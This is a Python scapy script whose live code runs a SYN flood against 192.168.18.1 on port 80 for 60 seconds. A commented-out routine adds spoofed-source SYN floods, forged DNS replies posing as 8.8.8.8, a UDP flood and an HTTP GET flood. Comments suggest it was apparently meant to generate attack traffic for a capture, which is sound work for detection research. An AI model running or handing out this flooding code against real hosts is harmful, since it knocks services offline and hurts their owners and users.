import os
import time
from scapy.all import *
import subprocess


from scapy.all import *
import time

def syn_flood(target_ip, target_port, duration=30):
    print(f"[+] Starting SYN flood to {target_ip}:{target_port} for {duration}s")
    end_time = time.time() + duration
    while time.time() < end_time:
        send(
            IP(dst=target_ip)/TCP(
                sport=RandShort(), 
                dport=target_port, 
                flags="S", 
                seq=RandInt()
            ),
            verbose=0
        )
    print("[+] Attack completed")

# Usage (run during capture)
# def launch_attack(target_ip):
#     """Generate detectable DoS attacks with DNS fallback handling"""
#     try:
#         print("[+] Starting enhanced DoS attack in 3 seconds...")
#         time.sleep(3)
        
#         # Phase 1: SYN Flood (always works with IPs)
#         print("[+] Phase 1: SYN Flood (500 packets, 60% response rate)")
#         for i in range(500):
#             src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}"
#             syn = IP(dst=target_ip, src=src_ip)/TCP(dport=80, flags="S", seq=i)
#             send(syn, verbose=0)
            
#             if random.random() < 0.6:
#                 time.sleep(0.005)
#                 syn_ack = IP(dst=src_ip, src=target_ip)/TCP(
#                     dport=syn[TCP].sport, sport=80,
#                     flags="SA", seq=random.randint(1000,50000), 
#                     ack=syn[TCP].seq+1
#                 )
#                 send(syn_ack, verbose=0)

#         # Phase 2: DNS Amplification with error handling
#         print("[+] Phase 2: DNS Amplification")
#         try:
#             for i in range(150):
#                 # Use safe DNS query format
#                 dns_query = IP(dst=target_ip)/UDP(dport=53)/DNS(
#                     rd=1, 
#                     qd=DNSQR(qname="example.com", qtype="A")  # Only "A" records
#                 )
#                 send(dns_query, verbose=0)
                
#                 if random.random() < 0.7:
#                     time.sleep(0.01)
#                     dns_response = IP(dst=target_ip, src="8.8.8.8")/UDP(sport=53)/DNS(
#                         id=dns_query[DNS].id,
#                         qr=1,
#                         qd=dns_query[DNS].qd,
#                         an=DNSRR(rrname=dns_query[DNS].qd.qname, ttl=10, rdata="1.1.1.1")
#                     )
#                     send(dns_response, verbose=0)
#         except Exception as e:
#             print(f"[!] DNS attack failed ({str(e)}), falling back to UDP flood")
#             # Fallback to raw UDP flood
#             for i in range(200):
#                 send(IP(dst=target_ip)/UDP(dport=random.randint(10000,60000))/Raw(load="X"*100), verbose=0)

#         # Phase 3: HTTP Flood (IP-based, no DNS needed)
#         print("[+] Phase 3: HTTP GET Flood")
#         for i in range(100):
#             payload = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
#             send(IP(dst=target_ip)/TCP(dport=80, flags="PA")/payload, verbose=0)
            
#             if random.random() < 0.3:
#                 time.sleep(0.1)
#                 http_resp = IP(dst=target_ip, src=target_ip)/TCP(
#                     sport=80, flags="PA"
#                 )/("HTTP/1.1 200 OK\r\nContent-Length: 500\r\n\r\n" + "B"*500)
#                 send(http_resp, verbose=0)

#         print("[+] Attack completed")
        
#     except Exception as e:
#         print(f"[!] Critical attack error: {e}")
if __name__ == "__main__":
 syn_flood("192.168.18.1", 80, duration=60)